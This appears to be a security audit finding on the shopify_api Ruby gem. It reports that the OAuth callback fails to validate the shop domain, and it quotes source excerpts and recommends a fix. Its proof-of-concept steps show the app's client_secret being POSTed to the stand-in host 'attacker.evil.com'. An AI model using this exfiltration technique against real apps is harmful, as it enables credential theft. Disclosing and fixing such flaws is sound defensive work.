This confirms the vulnerability: `ShopifyAPI::Utils::ShopValidator.sanitize!` exists and is explicitly used in `migrate_to_expiring_token`, `client_credentials.rb`, `refresh_token.rb`, and `clients/graphql/storefront.rb` to constrain a `shop` string to `TRUSTED_SHOPIFY_DOMAINS` before it is used to build a request host and before `client_secret` is sent. However, `ShopifyAPI::Auth::Oauth.validate_auth_callback` (and `begin_auth`) in `lib/shopify_api/auth/oauth.rb` never calls `ShopValidator` on `auth_query.shop` before passing it into `auth_base_uri(shop)`, which builds the host that receives the POST containing `client_id`, `client_secret`, and the authorization `code`.

### Title
Missing shop-domain validation in OAuth callback allows `client_secret` exfiltration via SSRF - (File: `lib/shopify_api/auth/oauth.rb`)

### Summary
`ShopifyAPI::Auth::Oauth.validate_auth_callback` uses `auth_query.shop` directly to build the URL (`auth_base_uri(shop)`) that the gem POSTs `client_id`/`client_secret`/`code` to, without ever validating that `shop` is a genuine `*.myshopify.com` (or other `ShopValidator::TRUSTED_SHOPIFY_DOMAINS`) host, even though this exact `ShopValidator.sanitize!` guard is applied to the same `shop`-to-host binding in sibling flows (`migrate_to_expiring_token`, `client_credentials.rb`, `refresh_token.rb`).

### Finding Description
The security-relevant equality this code is supposed to enforce is: `host that receives client_secret == a genuine Shopify shop domain`. In `validate_auth_callback` [1](#0-0) , the only check performed is `Utils::HmacValidator.validate(auth_query)`, which verifies the *integrity* of the query parameters (`code`, `host`, `shop`, `state`, `timestamp`) against the app's own `hmac`, but does not constrain which *values* `shop` is allowed to hold — it only proves the tuple wasn't tampered with relative to whatever `hmac` accompanies it. The `shop` value is then fed straight into `auth_base_uri(shop)` [2](#0-1) , which builds `"https://#{shop}/admin"` — this is the host the gem's `Clients::HttpClient` POSTs the access-token-exchange body to, including `client_secret: Context.api_secret_key` [3](#0-2) .

By contrast, `ShopifyAPI::Utils::ShopValidator.sanitize!` exists precisely to enforce this binding, restricting a shop string to `TRUSTED_SHOPIFY_DOMAINS` (`shopify.com`, `myshopify.io`, `myshopify.com`, `spin.dev`, `shop.dev`) before it is used to construct a request host [4](#0-3) , and this exact guard is applied in the sibling OAuth-adjacent method `migrate_to_expiring_token` right before building the request host and sending `client_secret` [5](#0-4) . `validate_auth_callback` and `begin_auth` are the only credential-sending paths in `lib/shopify_api/auth/oauth.rb` that omit this validation.

### Impact Explanation
If the host application passes an attacker-influenced `shop` value into `AuthQuery` (e.g., taken from a request header/param without the host app performing its own domain validation, which the library's own doc example for `begin_auth` does: `shop = request.headers["Shop"]`), the gem's `auth_base_uri` will construct a POST target under attacker control, and `validate_auth_callback` will unconditionally send the app's `client_id` and `client_secret` to that host in the access-token request body. This is exactly the class of bug described in the report's rule set — "a host validated versus the host that receives the access token or `client_secret`" — and results in `client_secret` exfiltration to an attacker-controlled server, a Critical-severity outcome.

### Likelihood Explanation
The `hmac` check does not gate the `shop` value's format, and the gem exposes no other enforcement point for `shop` in this path (unlike its sibling flows, which do call `ShopValidator.sanitize!`). Exploitability depends on the host application not independently validating `shop`, but the gem's own documented pattern for `begin_auth` pulls `shop` straight from a request header with no validation shown, and the gem provides no built-in defense in `validate_auth_callback`/`begin_auth` — unlike every other method in the library that talks to a shop-derived host with the client secret.

### Recommendation
Call `ShopifyAPI::Utils::ShopValidator.sanitize!(shop)` (or equivalent) on `auth_query.shop` inside `validate_auth_callback` before constructing `null_session`/`auth_base_uri`, and similarly validate `shop` in `begin_auth`, mirroring the guard already present in `migrate_to_expiring_token`, `client_credentials.rb`, and `refresh_token.rb`.

### Proof of Concept
1. Host app builds the OAuth begin/callback flow following the gem's documented pattern, taking `shop` from an unvalidated source (as in the gem's own doc example, `shop = request.headers["Shop"]`).
2. Attacker triggers `begin_auth`/`validate_auth_callback` with `shop = "attacker.evil.com"` and a `code`/`state` that pass the flow (attacker controls their own OAuth session/cookie/state matching).
3. `auth_base_uri("attacker.evil.com")` returns `"https://attacker.evil.com/admin"`.
4. `validate_auth_callback` POSTs `{client_id, client_secret: Context.api_secret_key, code, expiring}` to `https://attacker.evil.com/admin/oauth/access_token`, leaking the app's `client_secret` to the attacker's server. [6](#0-5)

### Citations

**File:** lib/shopify_api/auth/oauth.rb (L60-98)
```ruby
        def validate_auth_callback(cookies:, auth_query:)
          unless Context.setup?
            raise Errors::ContextNotSetupError, "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end
          raise Errors::InvalidOauthError, "Invalid OAuth callback." unless Utils::HmacValidator.validate(auth_query)
          raise Errors::UnsupportedOauthError, "Cannot perform OAuth for private apps." if Context.private?

          state = cookies[SessionCookie::SESSION_COOKIE_NAME]
          raise Errors::NoSessionCookieError unless state

          raise Errors::InvalidOauthError,
            "Invalid state in OAuth callback." unless state == auth_query.state

          null_session = Auth::Session.new(shop: auth_query.shop)
          body = {
            client_id: Context.api_key,
            client_secret: Context.api_secret_key,
            code: auth_query.code,
            expiring: Context.expiring_offline_access_tokens ? 1 : 0, # Only applicable for offline tokens
          }

          client = Clients::HttpClient.new(session: null_session, base_path: "/admin/oauth")
          response = begin
            client.request(
              Clients::HttpRequest.new(
                http_method: :post,
                path: "access_token",
                body: body,
                body_type: "application/json",
              ),
            )
          rescue ShopifyAPI::Errors::HttpResponseError => e
            raise Errors::RequestAccessTokenError,
              "Cannot complete OAuth process. Received a #{e.code} error while requesting access token."
          end

          session_params = T.cast(response.body, T::Hash[String, T.untyped]).to_h
          session = Session.from(shop: auth_query.shop,
            access_token_response: Oauth::AccessTokenResponse.from_hash(session_params))
```

**File:** lib/shopify_api/auth/oauth.rb (L117-128)
```ruby
        sig { params(shop: String).returns(String) }
        def auth_base_uri(shop)
          return "https://#{shop}/admin" unless defined?(DevServer) && shop.include?(".my.shop.dev")

          # For first-party apps in development only, we leverage DevServer to build the admin base URI
          admin_web = T.unsafe(Object.const_get("DevServer")) # rubocop:disable Sorbet/ConstantsFromStrings
            .new("admin-web")
          admin_host = admin_web.host!(nonstandard_host_prefix: "admin")
          shop_name = shop.split(".").first

          "https://#{admin_host}/store/#{shop_name}"
        end
```

**File:** lib/shopify_api/utils/shop_validator.rb (L50-64)
```ruby
        sig do
          params(
            shop: String,
            myshopify_domain: T.nilable(String),
          ).returns(String)
        end
        def sanitize!(shop, myshopify_domain: nil)
          host = sanitize_shop_domain(shop, myshopify_domain: myshopify_domain)
          if host.nil? || host.empty?
            raise Errors::InvalidShopError,
              "shop must be a trusted Shopify domain (see ShopValidator::TRUSTED_SHOPIFY_DOMAINS), got: #{shop.inspect}"
          end

          host
        end
```

**File:** lib/shopify_api/auth/token_exchange.rb (L97-107)
```ruby
        def migrate_to_expiring_token(shop:, non_expiring_offline_token:)
          unless ShopifyAPI::Context.setup?
            raise ShopifyAPI::Errors::ContextNotSetupError,
              "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end

          validated_shop = Utils::ShopValidator.sanitize!(shop)
          shop_session = ShopifyAPI::Auth::Session.new(shop: validated_shop)
          body = {
            client_id: ShopifyAPI::Context.api_key,
            client_secret: ShopifyAPI::Context.api_secret_key,
```
